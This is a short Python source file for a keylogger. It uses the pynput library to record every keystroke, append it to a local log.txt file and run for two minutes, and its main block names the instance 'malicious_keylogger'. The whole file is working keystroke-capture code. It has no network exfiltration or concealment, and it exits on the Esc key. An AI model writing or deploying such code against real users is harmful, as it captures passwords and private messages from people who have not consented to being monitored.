# keylogger.py

from pynput import keyboard
import time

class KeyLogger:
    def __init__(self) -> None:
        self.log = "KeyLogger has started..."

    def append_to_log(self, string):
        assert isinstance(string, str)
        self.log = self.log + string
        with open('log.txt', 'a') as log_file:
            log_file.write(string)

    def on_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == keyboard.Key.space:
                current_key = " "
            elif key == keyboard.Key.esc:
                print("Exiting program...")
                return False
            else:
                current_key = " " + str(key) + " "

        self.append_to_log(current_key)

    def start(self) -> None:
        keyboard_listener = keyboard.Listener(on_press=self.on_press)
        with keyboard_listener as listener:
            time.sleep(120)  # Keep the keylogger running for 2 minutes (adjust as needed)
            listener.stop()

if __name__ == "__main__":
    malicious_keylogger = KeyLogger()
    malicious_keylogger.start()
